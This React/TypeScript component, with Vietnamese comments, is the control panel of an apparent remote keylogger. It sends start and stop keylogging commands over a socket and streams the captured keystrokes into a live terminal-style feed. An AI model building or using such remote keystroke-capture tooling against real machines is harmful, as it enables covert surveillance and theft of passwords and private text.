// file: client/src/components/KeyloggerCard.tsx

import { useState, useEffect, useRef } from 'react';
import { Keyboard, Play, Square, Trash2, Download } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';
// Import component Cyberpunk
import { CyberCard, CyberButton } from './CyberUI'; 

export default function KeyloggerCard() {
    // --- GIỮ NGUYÊN LOGIC GỐC CỦA BẠN (KHÔNG SỬA GÌ CẢ) ---
    const [isLogging, setIsLogging] = useState(false);
    const [logs, setLogs] = useState<string>("");
    const { socket, isConnected } = useSocket();
    const logContainerRef = useRef<HTMLDivElement>(null);

    // --- SỬA LẠI LOGIC LẮNG NGHE (Y HỆT CODE BẠN GỬI) ---
    useEffect(() => {
        if (!socket) return;

        // 1. Lắng nghe PHÍM GÕ (Kênh riêng: ReceiveKey)
        socket.on("ReceiveKey", (key: string) => {
            // Chỉ cộng dồn ký tự, không thêm giờ giấc để nhìn tự nhiên
            setLogs(prev => prev + key);
        });

        // 2. (Tùy chọn) Lắng nghe trạng thái Bật/Tắt để hiện thông báo
        socket.on("ReceiveLog", (msg: string) => {
            if (msg.includes("STARTED")) {
                setLogs(prev => prev + "\n\n--- [SESSION STARTED] ---\n");
            }
            if (msg.includes("STOPPED")) {
                setLogs(prev => prev + "\n--- [SESSION STOPPED] ---\n");
            }
        });

        return () => {
            socket.off("ReceiveKey");
            socket.off("ReceiveLog");
        };
    }, [socket]);

    // Auto scroll (Y HỆT CODE BẠN GỬI)
    useEffect(() => {
        if (logContainerRef.current) {
            logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
        }
    }, [logs]);

    const handleStartLogging = async () => {
        setIsLogging(true);
        setLogs(""); // Xóa trắng màn hình khi bắt đầu mới
        try {
            await sendCommand('start_keylog');
        } catch (err) {
            alert("Lỗi: " + err);
            setIsLogging(false);
        }
    };

    const handleStopLogging = async () => {
        setIsLogging(false);
        try {
            await sendCommand('stop_keylog');
        } catch (err) {
            alert("Lỗi: " + err);
        }
    };

    const clearLogs = () => setLogs("");

    // --- CHỈ THAY ĐỔI GIAO DIỆN (Dùng CyberCard & CyberButton) ---
    return (
        <CyberCard title="KEYLOGGER_INTERCEPTOR" className="h-full flex flex-col">
            {/* Header Status (Design mới) */}
            <div className="flex items-center justify-between mb-2 pb-2 border-b border-gray-800">
                <div className="flex items-center gap-2">
                    <Keyboard className="w-4 h-4 text-cyber-yellow animate-pulse" />
                    <span className="text-xs font-mono text-gray-500">LIVE KEYSTROKE FEED</span>
                </div>
                <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${isLogging ? 'bg-cyber-red animate-pulse' : 'bg-gray-600'}`} />
                    <span className={`text-xs font-bold ${isLogging ? 'text-cyber-red' : 'text-gray-500'}`}>
                        {isLogging ? 'CAPTURING' : 'IDLE'}
                    </span>
                </div>
            </div>

            {/* Màn hình Terminal (Design mới nhưng hiển thị logs cũ) */}
            <div
                ref={logContainerRef}
                className="flex-1 bg-black border border-gray-800 p-3 overflow-y-auto custom-scrollbar font-mono text-xs shadow-inner min-h-[250px] mb-4"
            >
                {logs === "" ? (
                    <div className="h-full flex flex-col items-center justify-center text-gray-800 opacity-50">
                        <Keyboard size={48} className="mb-2" />
                        <p className="italic text-xs text-cyber-yellow">{'// Waiting for input...'}</p>
                    </div>
                ) : (
                    /* Hiển thị logs y hệt code gốc */
                    <pre className="text-cyber-blue leading-relaxed whitespace-pre-wrap break-all font-mono">
                        {logs}
                        {isLogging && <span className="text-cyber-yellow animate-pulse inline-block ml-1">█</span>}
                    </pre>
                )}
            </div>

            {/* Buttons (Design mới dùng CyberButton) */}
            <div className="grid grid-cols-12 gap-2">
                <div className="col-span-5">
                    <CyberButton
                        onClick={handleStartLogging}
                        disabled={isLogging || !isConnected}
                        variant="secondary"
                        className="w-full text-xs py-2"
                    >
                        <Play className="w-3 h-3 mr-2" /> START
                    </CyberButton>
                </div>

                <div className="col-span-5">
                    <CyberButton
                        onClick={handleStopLogging}
                        disabled={!isLogging}
                        variant="danger"
                        className="w-full text-xs py-2"
                    >
                        <Square className="w-3 h-3 mr-2 fill-current" /> STOP
                    </CyberButton>
                </div>

                <div className="col-span-2">
                    <CyberButton 
                        onClick={clearLogs} 
                        variant="ghost" 
                        className="w-full text-xs py-2 px-0 flex justify-center"
                    >
                        <Trash2 className="w-4 h-4" />
                    </CyberButton>
                </div>
            </div>
        </CyberCard>
    );
}